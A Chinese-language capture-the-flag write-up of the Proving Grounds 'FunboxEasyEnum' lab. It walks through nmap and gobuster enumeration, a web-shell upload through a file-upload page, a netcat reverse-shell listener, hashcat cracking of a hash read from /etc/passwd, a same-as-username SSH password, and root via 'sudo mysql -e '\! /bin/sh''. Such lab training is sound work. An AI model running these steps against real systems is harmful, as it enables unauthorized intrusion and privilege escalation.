# Proving Grounds->FunboxEasyEnum靶场笔记

### 惯例先扫IP段

```
nmap -sn -v 192.168.152.0/24
```

只扫到了给的IP192.168.152.132 和254

### 之后扫描所有端口（以最低一万的速率扫描端口） 

```
nmap -sT --min-rate 10000 -p- 192.168.152.132
```

发现只开放了22和80

### 对22、80进行针对性扫描

```
sudo nmap -sT -sC -sV -O -p22,80 192.168.152.132 -oA a.txt
-sT 以tcp协议进行扫描
-sC 以nmap默认脚本进行扫描
-sV 探测服务的版本
-O  探测操作系统的版本
-p  指定端口
-oA 对扫描的结果进行全格式输出
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9c52325b8bf638c77fa1b704854954f3 (RSA)
|   256 d6135606153624ad655e7aa18ce564f4 (ECDSA)
|_  256 1ba9f35ad05183183a23ddc4a9be59f0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.6 (87%), Linux 2.6.32 (86%), Linux 2.6.32 or 3.10 (86%), Linux 3.5 (86%), Linux 4.4 (86%), Synology DiskStation Manager 5.1 (86%), WatchGuard Fireware 11.8 (86%), Linux 5.3 - 5.4 (86%), Linux 4.8 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.37 seconds
                                                                                                                   
```

### 进行默认脚本扫描

```
sudo nmap --script=vuln -p22,80 192.168.152.132
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /robots.txt: Robots file
|_  /phpmyadmin/: phpMyAdmin
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 62.72 seconds
```

### 对扫描结果中的robots.txt、phpmyadmin进行探测

```
 robots.txt就是一个简单地文本
 Allow: Enum_this_Box
 phpMyAdmin就是一个普通的登录页面
 80端口也是一个默认页
```

### 启动gobuster进行目录爆破,再添加后缀名参数，针对特殊后缀再开一个扫描

```
sudo gobuster dir -u http://192.168.152.132/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
sudo gobuster dir -u http://192.168.152.132/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,txt,rar,zip,tar
sudo gobuster dir -u http://192.168.228.230/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
```

扫到一个特殊的php 进去看看，是任意文件上传，话不多说，直接上大马

```
/mini.php             (Status: 200) [Size: 3828]
```

![image-20230419110944455](https://s2.loli.net/2023/04/23/PULez2SKRQGrOyt.png)

### 反弹shell

```
sudo nc -nlvp 3242
whoami
cd /var/www/
ls -al
cat local.txt 
068e5be7068b17bf04bc5b2219ab7f90

```

![image-20230419112653338](https://s2.loli.net/2023/04/23/SlXEyeduptWCD4x.png)

![image-20230419113506965](https://s2.loli.net/2023/04/23/35Y8POqA2s9t6VD.png)

### 开始考虑如何提权

cat /etc/passwd 发现了orcale 用户的hash，爆破了一波没结果，find提权也不太行，陷入僵局

```
.\hashcat.exe -a 0 .\rockyou.txt -m 500 $1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0  -o fuck.txt
.\hashcat.exe -a 3 -1 ?d?u?l?s  --increment --increment-min 1 --increment-max 8 -m 500 .\doit.txt  -o fuck.txt

oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
```

![image-20230419140627761](C:\Users\anhunsec\Desktop\靶场特训\image\image-20230419140627761.png)

![](C:\Users\anhunsec\Desktop\靶场特训\image\image-20230419135828858.png)

进home目录看看，用户挺多，

![image-20230419145519816](C:\Users\anhunsec\Desktop\靶场特训\image\image-20230419145519816.png)

goat用户目录可以进去，但是没找到有用的信息，有点绝望了，在试试提权，至少先提一个普通用户

```
开始碰弱口令 ssh goat@192.168.176.132  goat 
一发入魂，谁能想到用户名密码都一样
剩下的就简单了
sudo -l 看看当前用户可以用 sudo 执行那些命令
发现有mysql
去这里找下
https://gtfobins.github.io/gtfobins/mysql/#shell
如果允许二进制文件以超级用户身份运行 sudo，它不会放弃提升的特权，可用于访问文件系统、升级或维护特权访问。
sudo mysql -e '\! /bin/sh'
#号出现 over
```

![image-20230419170642268](https://s2.loli.net/2023/04/23/ep5FCdHgaROcqQl.png)